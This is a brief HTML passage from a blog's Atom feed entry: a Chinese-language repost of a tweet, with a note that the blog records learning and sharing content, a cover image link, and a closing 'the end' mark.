<h2 id="转自推特"><a href="https://twitter.com/xiaxiangzhou/status/1515478134149173248">转自推特</a></h2>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1650265457417.jpg" alt="" loading="lazy"></p>
<p>(完)</p>
]]></content>
    </entry>
</feed>